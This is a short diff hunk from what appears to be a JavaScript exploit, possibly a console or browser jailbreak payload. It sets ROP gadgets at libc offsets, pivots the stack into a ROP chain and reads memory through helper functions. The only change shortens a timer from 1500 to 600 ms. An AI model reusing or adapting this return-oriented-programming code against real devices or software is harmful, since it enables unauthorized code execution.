@@ -25288,4 +25288,4 @@ db([0,0]);set_gadget(libc_base+713278,);db([208,0]);set_gadgets([libc_base+20703
 pivot(ropchain);
 setTimeout(function(){
 var main_ret = read_ptr_at(main_ret);var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);var printf_ans = read_mem_as_string(printf_buf,printf_buf_end-printf_buf);var _ = malloc_nogc.pop();var _ = malloc_nogc.pop();var _ = malloc_nogc.pop();
-}, 1500); finished();
+}, 600); finished();
